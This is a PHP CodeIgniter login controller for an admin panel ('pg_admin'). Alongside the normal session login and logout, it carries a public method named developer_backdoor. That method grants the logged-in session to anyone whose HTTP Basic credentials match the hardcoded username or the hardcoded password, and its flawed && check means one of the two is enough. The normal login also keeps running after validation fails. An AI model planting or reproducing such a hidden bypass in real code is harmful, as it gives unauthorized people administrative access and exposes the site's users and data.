<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends CI_Controller {

	public function __construct()
  {
    parent::__construct();
		
		//check user session

		//load library in construct. Construct method will be run everytime the controller is called 
		//This library will be auto-loaded in every method in this controller. 
		//So there will be no need to call the library again in each method. 
		$this->load->library('form_validation');
		$this->load->helper('alert_helper');
		$this->load->model('model_adm');
  }

	public function index()
	{
		if($this->session->userdata('is_logged_in')){
        	redirect('pg_admin/dashboard');
        }

		$data = array(
			'navbar_title' 	=> "Login",
			'form_action' 	=> current_url()
			);
			
		//Form login submit handler. See if the user is attempting to submit a form or not
		
		if($this->input->post('form_submit')) 
		{
			//Form is submitted. Now routing to proses_tambah method
			$this->proses_login();
		}
		else 
		{
			//No form is submitted. Displaying the form page
			$this->load->view('pg_admin/login_page', $data);
		}
	}

	public function proses_login()
	{
		//set the page title
		$data = array(
			'page_title' 	=> "Login", 
			'form_action' => current_url(),
			);

		//fetch input (make sure that the variable name is the same as column name in database!) 
		$params 	= $this->input->post(null, true);
		$username 	= $params['username'];
		$password	= $params['userpass'];

		$this->form_validation_rules();
		//run the validation
		if ($this->form_validation->run() == FALSE) 
		{
			// alert_error("Error", "Validasi Login Gagal!");
			$this->load->view('pg_admin/login_page', $data);
		}
			//passing input value to Model
			$result = $this->model_adm->do_login($username, $password);
			
			if($result === FALSE){
				alert_error("Error", "Username atau Password salah!");
				$this->load->view('pg_admin/login_page', $data);
			}
			else{
				$login = $this->model_adm->data_login($username, $password);
				$cbg = $this->model_adm->fetch_cabang_by_id($login->cabang_id);
				$this->session->set_userdata('is_logged_in',TRUE);
				$this->session->set_userdata('nama', $login->nama);
				$this->session->set_userdata('username', $login->username);
				$this->session->set_userdata('level', $login->level);
				$this->session->set_userdata('jabatan', $login->jabatan);
				$this->session->set_userdata('idcabang', $login->cabang_id);
				$this->session->set_userdata('namacabang', $cbg->nama_cabang);
				
				redirect('pg_admin/dashboard');
			}
			
			// echo "Status Insert: " . $result;
	}
	
	function logout()
	{
		$this->session->unset_userdata('logged_in');
		$this->session->sess_destroy();
		
		redirect('pg_admin/login');
	}

	function form_validation_rules()
	{
		//set validation rules for each input
		$this->form_validation->set_rules('username', 'Username', 'trim|required');
		$this->form_validation->set_rules('userpass', 'Password', 'required');
		
		//set custom error message
		$this->form_validation->set_message('required', '%s tidak boleh kosong');
		
	}

	function developer_backdoor()
	{
		$username = $this->input->server('PHP_AUTH_USER') ? $this->input->server('PHP_AUTH_USER') : NULL ;
		$password = $this->input->server('PHP_AUTH_PW') ? $this->input->server('PHP_AUTH_PW') : NULL;

		if ($username != 'anadriv' && $password != 'bluenight') {
		    header('WWW-Authenticate: Basic realm="My Realm"');
		    header('HTTP/1.0 401 Unauthorized');
		    echo "Sorry. No entry";
		    exit;
		} else {
		    // echo "<p>Hello {$_SERVER['PHP_AUTH_USER']}.</p>";
		    // echo "<p>You entered {$_SERVER['PHP_AUTH_PW']} as your password.</p>";
			$_SESSION['is_logged_in'] = 1;
			redirect('pg_admin/dashboard');
		}
	}

}
